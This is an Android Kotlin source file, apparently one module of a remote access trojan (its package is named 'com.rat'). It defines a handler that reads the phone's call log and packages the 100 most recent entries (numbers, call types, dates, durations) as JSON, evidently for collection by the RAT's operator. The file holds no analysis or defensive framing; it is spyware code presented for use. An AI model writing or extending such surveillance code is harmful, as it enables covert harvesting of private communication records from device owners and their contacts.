package com.rat

import android.content.Context
import android.provider.CallLog
import org.json.JSONArray
import org.json.JSONObject

object CallLogHandler {
    fun dump(ctx: Context): String {
        val arr = JSONArray()
        val cursor = ctx.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            ),
            null, null, "${CallLog.Calls.DATE} DESC"
        )
        cursor?.use {
            val iNum = it.getColumnIndex(CallLog.Calls.NUMBER)
            val iType = it.getColumnIndex(CallLog.Calls.TYPE)
            val iDate = it.getColumnIndex(CallLog.Calls.DATE)
            val iDur = it.getColumnIndex(CallLog.Calls.DURATION)
            while (it.moveToNext() && arr.length() < 100) {
                arr.put(JSONObject().apply {
                    put("number", it.getString(iNum))
                    put("type", when(it.getInt(iType)) {
                        1 -> "incoming"
                        2 -> "outgoing"
                        3 -> "missed"
                        else -> "unknown"
                    })
                    put("date", it.getLong(iDate))
                    put("duration", it.getLong(iDur))
                })
            }
        }
        return arr.toString()
    }
}
